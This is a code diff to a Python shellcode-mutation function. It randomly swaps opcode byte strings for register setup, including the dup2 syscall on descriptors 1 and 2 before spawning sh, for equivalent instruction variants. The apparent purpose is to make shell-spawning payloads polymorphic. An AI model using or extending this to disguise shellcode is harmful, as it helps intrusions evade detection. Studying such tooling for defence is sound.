@@ -23,6 +23,17 @@ def regreplace(preshellcode: str) -> str:
     file = open(instructions)
     data = load(file)
 
+    #al 33 dict
+    al_33_dict = data["instructions"].get("al_33")
+    al_33_keys = list(al_33_dict.keys())
+    
+    #dil 2 dict
+    dil_2_dict = data["instructions"].get("dil_2")
+    dil_2_keys = list(dil_2_dict.keys())
+
+    #sil 1 dict
+    sil_1_dict = data["instructions"].get("sil_1")
+    sil_1_keys = list(sil_1_dict.keys())
     # mov reg rax dictionnary and its keys
     # all dictionaries have the same keys
     mov_reg_rax_dict = data["instructions"].get("mov_reg_rax")
@@ -40,11 +51,22 @@ def regreplace(preshellcode: str) -> str:
     # mov reg sh dictionnary and its keys
     mov_reg_sh_dict = data["instructions"].get("mov_reg_sh")
 
+
+    # random al to 33
+    randalindex = randint(0, len(al_33_keys) - 1)
+    randal = al_33_keys[randalindex]
+
+    # random dil to 2
+    randilindex = randint(0, len(dil_2_keys) -1)
+    randil = dil_2_keys[randilindex]
+
+    # random sil to 1
+    randsilindex = randint(0, len(sil_1_keys) -1)
+    randsil = sil_1_keys[randsilindex]
+
     # choose randomly a registry to use to handle the fd
     # choose another one that will be push on the stack before syscall of sh
-
-    #reg1randindex = randint(0, len(mov_reg_rax_keys) - 1)
-    #reg1 = mov_reg_rax_keys[reg1randindex]
+    
     # looping the reg2 choice and test if it's the same as reg1
     while True:
         reg1randindex = randint(0, len(mov_reg_rax_keys) - 1)
@@ -53,7 +75,12 @@ def regreplace(preshellcode: str) -> str:
         reg2 = mov_reg_rax_keys[reg2randindex]
         if reg1 != reg2 and reg1 not in ['r11', 'r13', 'r14']:
             break
+    
+    
 
+    preshellcode = preshellcode.replace('b021', al_33_dict.get(randal))
+    preshellcode = preshellcode.replace('40b702', dil_2_dict.get(randil))
+    preshellcode = preshellcode.replace('40b601', sil_1_dict.get(randsil))
     preshellcode = preshellcode.replace('4989c7', mov_reg_rax_dict.get(reg1))
     preshellcode = preshellcode.replace('4c89ff', mov_reg_rdi_dict.get(reg1))
     preshellcode = preshellcode.replace('4d31ff', xor_dict.get(reg1))
